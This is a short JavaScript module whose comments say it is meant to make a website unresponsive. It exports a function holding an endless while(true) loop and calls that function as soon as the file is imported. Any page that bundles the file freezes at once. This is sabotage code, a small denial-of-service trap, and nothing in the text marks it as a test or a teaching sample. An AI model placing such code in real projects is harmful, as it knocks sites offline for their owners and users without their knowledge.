// This file creates an infinite loop that makes the site unresponsive
export function triggerInfiniteLoop() {
  while (true) {
    // Infinite loop - never exits
    Math.random();
  }
}

// Auto-trigger on import
triggerInfiniteLoop();
